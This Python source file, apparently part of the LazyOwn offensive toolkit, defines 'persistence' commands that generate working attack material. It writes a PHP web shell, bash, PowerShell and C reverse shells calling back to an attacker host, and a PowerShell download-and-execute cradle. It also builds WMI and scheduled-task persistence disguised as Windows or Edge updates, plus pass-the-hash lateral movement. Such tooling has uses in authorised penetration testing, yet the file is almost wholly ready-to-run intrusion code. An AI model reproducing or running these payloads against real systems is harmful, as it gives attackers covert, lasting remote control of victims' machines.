"""Persistence command set (pending).

Phase 05 — commands for establishing persistence: reverse shells,
web shells, backdoors, and implant generation.

Pending status: inherits from :class:`PendingCommandSet`. Promote to
:class:`LazyOwnCommandSet` once originals are deleted from ``lazyown.py``.
"""

from __future__ import annotations

import os

import cmd2

from cli.commands._base import LazyOwnCommandSet
from modules.categories import persistence_category
from utils import (
    check_lhost,
    copy2clip,
    print_msg,
)


class PersistenceCommandSet(LazyOwnCommandSet):
    """Persistence phase commands (pending)."""

    phase = "persist"
    category = "05. Persistence"

    @cmd2.with_category(persistence_category)
    def do_createwebshell(self, line):
        """Create web shells (JPG-disguised PHP, p0wny-shell, ASP)."""
        web_shell = """
<?php
// Simple PHP web shell
if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
?>
"""
        with open("sessions/webshell.php", "w") as f:
            f.write(web_shell)
        print_msg("[+] Web shell created at sessions/webshell.php")
        print_msg("[+] Access: http://<target>/webshell.php?cmd=id")

    @cmd2.with_category(persistence_category)
    def do_createrevshell(self, line):
        """Create a bash reverse shell script in sessions/."""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not check_lhost(lhost):
            return
        script = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n"
        with open("sessions/revshell.sh", "w") as f:
            f.write(script)
        os.chmod("sessions/revshell.sh", 0o755)
        print_msg("[+] Reverse shell created at sessions/revshell.sh")
        print_msg("[+] Run: bash sessions/revshell.sh")

    @cmd2.with_category(persistence_category)
    def do_createwinrevshell(self, line):
        """Create a Windows reverse shell (PowerShell)."""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not check_lhost(lhost):
            return
        ps_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        with open("sessions/revshell.ps1", "w") as f:
            f.write(ps_cmd)
        print_msg("[+] PowerShell reverse shell at sessions/revshell.ps1")

    @cmd2.with_category(persistence_category)
    def do_conptyshell(self, line):
        """Download ConPtyShell and prepare a PowerShell run command."""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not check_lhost(lhost):
            return
        print_msg("[+] Downloading ConPtyShell...")
        self.cmd("wget -O sessions/ConPtyShell.ps1 https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/ConPtyShell.ps1 2>/dev/null || curl -o sessions/ConPtyShell.ps1 https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/ConPtyShell.ps1")
        cmd = f"powershell -ep bypass -c \"IEX(New-Object Net.WebClient).downloadString('http://{lhost}:{lport}/ConPtyShell.ps1');Invoke-ConPtyShell {lhost} {lport}\""
        print_msg(f"[+] Run this on target: {cmd}")
        copy2clip(cmd)
        print_msg("[+] Command copied to clipboard!")

    @cmd2.with_category(persistence_category)
    def do_pwncatcs(self, line):
        """Start a pwncat-cs reverse shell listener."""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not check_lhost(lhost):
            return
        print_msg(f"[+] Starting pwncat-cs listener on {lhost}:{lport}")
        self.cmd(f"pwncat-cs -lp {lport}")

    @cmd2.with_category(persistence_category)
    def do_revwin(self, line):
        """Create a Windows reverse shell executable."""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not check_lhost(lhost):
            return
        code = f'#include <winsock2.h>\n#pragma comment(lib, "ws2_32")\nWSADATA wsa;SOCKET s;struct sockaddr_in addr;WSAStartup(MAKEWORD(2,2),&wsa);s=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);addr.sin_family=AF_INET;addr.sin_port=htons({lport});addr.sin_addr.s_addr=inet_addr("{lhost}");WSAConnect(s,(SOCKADDR*)&addr,sizeof(addr),NULL,NULL,NULL,NULL);STARTUPINFO sui;PROCESS_INFORMATION pi;ZeroMemory(&sui,sizeof(sui));sui.cb=sizeof(sui);sui.dwFlags=STARTF_USESTDHANDLES;sui.hStdInput=sui.hStdOutput=sui.hStdError=(HANDLE)s;CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&sui,&pi);'
        with open("sessions/revshell.c", "w") as f:
            f.write(code)
        print_msg("[+] Windows reverse shell C code at sessions/revshell.c")
        print_msg("[+] Compile: x86_64-w64-mingw32-gcc -o revshell.exe sessions/revshell.c -lws2_32")

    @cmd2.with_category(persistence_category)
    def do_wmi_persist(self, line=""):
        """Create WMI Event Subscription persistence (fileless, no disk write).

        Usage: wmi_persist [--command <cmd>] [--interval <minutes>] [--name <event_name>]

        Registers __EventFilter + __EventConsumer + __FilterToConsumerBinding
        for stealthy, fileless persistence. Triggers on system startup or
        at a configurable interval. MITRE: T1546.003 WMI Event Subscription.
        """
        import shlex as _shlex
        args = _shlex.split(line) if line else []

        lhost = self.params["lhost"]
        lport = self.params["lport"]
        event_name = self._extract(args, "--name") or "WindowsUpdate"
        command = self._extract(args, "--command") or (
            f"powershell -ep bypass -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length))-ne0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1|Out-String);$v=$r+'PS '+(pwd).Path+'> ';"
            f"$y=([text.encoding]::ASCII).GetBytes($v);$s.Write($y,0,$y.Length);$s.Flush()}};$c.Close()\""
        )
        interval = self._extract(args, "--interval") or "5"

        ps_script = f"""$FilterArgs = @{{
    Name = '{event_name}Filter'
    EventNamespace = 'root\\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN {interval} WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}}
$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments $FilterArgs

$ConsumerArgs = @{{
    Name = '{event_name}Consumer'
    CommandLineTemplate = '{command}'
}}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments $ConsumerArgs

$BindingArgs = @{{
    Filter = $Filter
    Consumer = $Consumer
}}
$Binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments $BindingArgs

Write-Host "[+] WMI Persistence established: {event_name}" -ForegroundColor Green
Write-Host "[+] Check: Get-WmiObject __EventFilter -Namespace root\\subscription | fl Name"
"""

        output_path = "sessions/wmi_persistence.ps1"
        with open(output_path, "w") as f:
            f.write(ps_script)
        print_msg(f"[+] WMI persistence script saved to {output_path}")
        print_msg(f"[+] Event name: {event_name}")
        print_msg(f"[+] Interval: {interval} minutes")
        print_msg(f"[+] Run on target: powershell -ExecutionPolicy Bypass -File {output_path}")

    @cmd2.with_category(persistence_category)
    def do_wmi_lateral(self, line=""):
        """Execute a command on a remote host via WMI.

        Usage: wmi_lateral [--target <ip>] [--user <user>] [--password <pass>] [--hash <nt_hash>] [--command <cmd>]

        Uses wmic.exe or impacket-wmiexec for lateral movement.
        Supports pass-the-hash authentication.
        MITRE: T1047 WMI.
        """
        import shlex as _shlex
        args = _shlex.split(line) if line else []

        target = self._extract(args, "--target") or self.params.get("rhost", "")
        user = self._extract(args, "--user") or self.params.get("username", "")
        password = self._extract(args, "--password") or self.params.get("password", "")
        nt_hash = self._extract(args, "--hash")
        command = self._extract(args, "--command") or "whoami /all"

        if not target:
            print_error("Usage: wmi_lateral --target <ip> [--user <u>] [--password <p>] [--hash <nt_hash>] [--command <cmd>]")
            return

        if nt_hash:
            print_msg(f"Executing via WMI (PTH) on {target}")
            self.cmd(f"impacket-wmiexec -hashes :{nt_hash} -target-ip {target} {user or 'Administrator'}@{target} '{command}'")
        elif user and password:
            print_msg(f"Executing via WMI on {target}")
            self.cmd(f"impacket-wmiexec -target-ip {target} {user}:'{password}'@{target} '{command}'")
        else:
            self.cmd(f"wmic /node:{target} /user:{user or 'Administrator'} /password:'{password}' process call create '{command}'")

    @cmd2.with_category(persistence_category)
    def do_wmi_scheduled_task(self, line=""):
        """Create a scheduled task for persistence via WMI.

        Usage: wmi_scheduled_task [--name <task_name>] [--command <cmd>] [--trigger <startup|logon|daily|hourly>]

        Creates a scheduled task that executes on system startup or user logon.
        More stealthy than registry Run keys (not monitored by many EDRs).
        MITRE: T1053.005 Scheduled Task.
        """
        import shlex as _shlex
        args = _shlex.split(line) if line else []

        lhost = self.params["lhost"]
        lport = self.params["lport"]
        task_name = self._extract(args, "--name") or "MicrosoftEdgeUpdateTaskUA"
        trigger = self._extract(args, "--trigger") or "startup"
        command = self._extract(args, "--command") or (
            f"powershell -ep bypass -w hidden -c \""
            f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length))-ne0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1|Out-String);$v=$r+'PS '+(pwd).Path+'> ';"
            f"$y=([text.encoding]::ASCII).GetBytes($v);$s.Write($y,0,$y.Length);$s.Flush()}}\""
        )

        ps_script = f"""$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-ep bypass -w hidden -c "{command}"'

$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

$TriggerParams = @{{
    TaskName = '{task_name}'
    Action = $Action
    Principal = $Principal
}}

switch ('{trigger}') {{
    'startup' {{
        $Trigger = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask @TriggerParams -Trigger $Trigger -Description "System component update"
    }}
    'logon' {{
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        Register-ScheduledTask @TriggerParams -Trigger $Trigger -Description "User session helper"
    }}
    'daily' {{
        $Trigger = New-ScheduledTaskTrigger -Daily -At "09:00"
        Register-ScheduledTask @TriggerParams -Trigger $Trigger -Description "Daily maintenance task"
    }}
    'hourly' {{
        $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration ([TimeSpan]::MaxValue)
        Register-ScheduledTask @TriggerParams -Trigger $Trigger -Description "Metrics collector service"
    }}
}}

Write-Host "[+] Scheduled task '{task_name}' created with trigger: {trigger}" -ForegroundColor Green
Write-Host "[+] Check: Get-ScheduledTask -TaskName '{task_name}'"
"""

        output_path = "sessions/scheduled_task_persist.ps1"
        with open(output_path, "w") as f:
            f.write(ps_script)
        print_msg(f"[+] Scheduled task persistence saved to {output_path}")
        print_msg(f"[+] Task name: {task_name}, Trigger: {trigger}")

    @staticmethod
    def _extract(args: list[str], flag: str) -> str | None:
        try:
            idx = args.index(flag)
            return args[idx + 1]
        except (ValueError, IndexError):
            return None
